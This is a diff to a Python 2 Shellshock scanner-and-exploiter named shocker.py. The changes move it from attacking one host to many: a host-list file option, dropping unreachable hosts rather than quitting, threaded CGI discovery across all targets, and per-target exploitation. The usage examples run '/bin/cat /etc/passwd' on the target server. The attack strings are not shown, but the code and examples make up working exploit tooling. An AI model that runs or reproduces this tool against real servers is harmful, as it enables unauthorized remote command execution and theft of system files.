@@ -16,45 +16,18 @@ A tool to find and exploit webservers vulnerable to Shellshock
 ##############################################################################
 
 Usage examples:
-./shocker.py 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
+./shocker.py -H 127.0.0.1 -e "/bin/cat /etc/passwd" -c /cgi-bin/test.cgi
 Scans for http://127.0.0.1/cgi-bin/test.cgi and, if found, attempts to cat 
 /etc/passwd
 
-./shocker.py www.example.com -p 8001 -s
+./shocker.py -H www.example.com -p 8001 -s
 Scan www.example.com on port 8001 using SSL for all scripts in cgi_list and
 attempts the default exploit for any found
 
-Changes in version 0.5
-* Added ability to specify a single script to target rather than using cgi_list
-* Introduced a timeout on socket operations for host_check
-* Added some usage examples in the script header
-* Added an epilogue to the help text indicating presence of examples
+./shocker.py -f iplist
+Scans all hosts specified in the file ./iplist with default options
 
-Changes in version 0.4
-* Introduced a thread count limit defaulting to 10
-* Removed colour support until I can figure out how to make it work in\
-    Windows and *nix equally well
-* Spelling corrections
-* More comprehensive cgi_list
-* Removes success_flag from output
-
-TODO
-
-Add some slightly more useful exploitation options. (Shells?)
-Support for multiple hosts via a file switch on the command line?
-Add a summary of results before exiting
-Save results to a file? Format?
-* Eventually the idea is to include multiple possible vectors but currently\
-    only one is checked.
-Implement some form of progress indicator for slow tasks
-Fix problem with proxy returning 200 for unavailable URLs/false positives
-Add Windows and *nix colour support
-Prettify
-Move cgi list into a seperate file
-Other stuff. Probably.
-
-Thanks to...
-Anthony Caulfield @ NCC for time and effort reviewing early versions
+Read the README for more details
 """
 
 import urllib2
@@ -67,6 +40,7 @@ import sys
 import socket
 import Queue
 import threading
+import re
 
 
 # A list of potential CGI scripts to look for on the target host
@@ -488,8 +462,8 @@ user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)"
 def signal_handler(signal, frame):
     sys.exit(0)
 
-
-def check_host(host_target_list, port, verbose):
+def check_hosts(host_target_list, port, verbose):
+    confirmed_hosts = [] # List of resoveable and reachable hosts
     print "[+] Checking setup..."
     for host in host_target_list:
         try:
@@ -502,73 +476,73 @@ def check_host(host_target_list, port, verbose):
             s.connect((ipaddr, int(port)))
             s.close()
             if verbose: print "[I] %s seems reachable..." % host
+            confirmed_hosts.append(host)
         except Exception as e:
-            print "[-] Exception - %s: %s" % (host, e)
-            print "[-] Exiting..."
-            exit(1)
+            print "[!] Exception - %s: %s" % (host, e)
+            print "[!] Omitting %s from target list..." % host
     print "[+] Good to go!"
+    return confirmed_hosts
 
-
-def scan_host(protocol, host, port, proxy, verbose):
+def scan_hosts(protocol, host_target_list, port, proxy, verbose):
     # List of potentially epxloitable URLs 
     exploit_targets = []
     cgi_index = 0
     cgi_num = len(cgi_list)
     q = Queue.Queue()
     threads = []
-
-    # Go through each potential cgi in cgi_list spinning up a thread for each
-    # check. Create Request objects for each check. 
-    print "[+] Starting host scan for %s on port %s" % (host, port) 
-    print "[+] Looking for CGIs..."
-    for cgi in cgi_list:
-        cgi_index += 1
-        try:
-            req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
-            url = req.get_full_url()
-            if proxy:
-                req.set_proxy(proxy, "http")    
-            
-            # Pretend not to be Python for no particular reason
-            req.add_header("User-Agent", user_agent)
-
-            # Set the host header correctly (Python includes :port)
-            req.add_header("Host", host)
-            
-            thread_pool.acquire()
-            
-            # Start a thread for each CGI in cgi_list
-            if verbose: print "[I] Starting thread %i" % cgi_index
-            t = threading.Thread(target = check_cgi, args = (req, q))
-            t.start()
-            threads.append(t)
-        except Exception as e: 
-            if verbose: print "[+] %s - %s" % (url, e) 
-        finally:
-            pass
-
-    # Wait for all the threads to finish before moving on    
-    for thread in threads:
-        thread.join()
-
-    print "[+] Finished host scan"
     
-    # Pop any results from the Queue and add them to the list of potentially 
-    # exploitable urls (exploit_targets) before returning that list
-    while not q.empty():
-        exploit_targets.append(q.get())
+    for host in host_target_list:
+        # Go through each potential cgi in cgi_list spinning up a thread for each
+        # check. Create Request objects for each check. 
+        print "[+] Starting host scan for %s on port %s" % (host, port) 
+        print "[+] Looking for CGIs..."
+        for cgi in cgi_list:
+            cgi_index += 1
+            try:
+                req = urllib2.Request(protocol + "://" + host + ":" + port + cgi)
+                url = req.get_full_url()
+                if proxy:
+                    req.set_proxy(proxy, "http")    
+                
+                # Pretend not to be Python for no particular reason
+                req.add_header("User-Agent", user_agent)
+
+                # Set the host header correctly (Python includes :port)
+                req.add_header("Host", host)
+                
+                thread_pool.acquire()
+                
+                # Start a thread for each CGI in cgi_list
+                if verbose: print "[I] Starting thread %i" % cgi_index
+                t = threading.Thread(target = check_cgi, args = (req, q, verbose))
+                t.start()
+                threads.append(t)
+            except Exception as e: 
+                if verbose: print "[+] %s - %s" % (url, e) 
+            finally:
+                pass
+
+        # Wait for all the threads to finish before moving on    
+        for thread in threads:
+            thread.join()
+    
+        # Pop any results from the Queue and add them to the list of potentially 
+        # exploitable urls (exploit_targets) before returning that list
+        while not q.empty():
+            exploit_targets.append(q.get())
+    print "[+] Finished host scan"
     return exploit_targets
 
-def check_cgi(req, q):
+def check_cgi(req, q, verbose):
     try:
-        if urllib2.urlopen(req, None, 5):
+        if urllib2.urlopen(req, None, 5).getcode() == 200:
             q.put(req.get_full_url())
     except Exception as e:
-        pass
+        if verbose: print "[-] %s for %s" % (e, req.get_full_url()) 
     finally:
         thread_pool.release()
 
-def exploit_cgi(host, proxy, target_list, exploit, verbose):
+def exploit_cgi(proxy, target_list, exploit, verbose):
     # Flag used to identify whether the exploit has successfully caused the
     # server to return a useful response
     success_flag = ''.join(
@@ -584,6 +558,7 @@ def exploit_cgi(host, proxy, target_list, exploit, verbose):
     print "[+] Attempting exploits..."
     for target in target_list:
         print "\n[+] Trying exploit for %s" % target 
+        host = target.split(":")[1][2:] # substring host from target URL
         for header, attack in attack_strings.iteritems():
             try:
                 if verbose:
@@ -616,23 +591,26 @@ def exploit_cgi(host, proxy, target_list, exploit, verbose):
                 pass
 
 def validate_address(hostaddress):
-    """ Attempt to identify if proposed host address is invalid """
-    return True
+    """ Attempt to identify if proposed host address is invalid by matching
+    against some very rough regexes """
+
+    singleIP_pattern = re.compile('^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
+    FQDN_pattern = re.compile('^(\w+\.)+\w+$')
+    if singleIP_pattern.match(hostaddress) or FQDN_pattern.match(hostaddress):
+        return True 
+    else:
+        print "Host %s appears invalid, exiting..." % hostaddress
+        exit(0)
 
 def get_targets_from_file(file):
     host_target_list = []
     with open(file, 'r') as f:
         for line in f:
             line = line.strip()
-            if line[0] is not "#":
-                if validate_address(line):
-                    host_target_list.append(line)
-                else:
-                    print "%s in %s appears invalid. Exiting..." % (line, f)
-                    exit(1)
+            if line[0] is not "#" and validate_address(line):
+                host_target_list.append(line)
     print "DEBUG: %s" % host_target_list
     return host_target_list
-
 
 def main():
     print """
@@ -742,15 +720,15 @@ def main():
         global cgi_list
         cgi_list = [args.cgi]
 
-    # Check to see host resolves and is reachable on the chosen port
-    check_host(host_target_list, port, verbose)
+    # Check hosts resolve and are reachable on the chosen port
+    confirmed_hosts = check_hosts(host_target_list, port, verbose)
 
     # Go through the cgi_list looking for any present on the target host
-    target_list = scan_host(protocol, host, port, proxy, verbose)
+    target_list = scan_hosts(protocol, confirmed_hosts, port, proxy, verbose)
 
     # If any cgi scripts were found on the target host try to exploit them
     if len(target_list) > 0:
-        exploit_cgi(host, proxy, target_list, exploit, verbose)
+        exploit_cgi(proxy, target_list, exploit, verbose)
     else:
         print "[+] No potential targets found - Exiting..."
         exit(0)
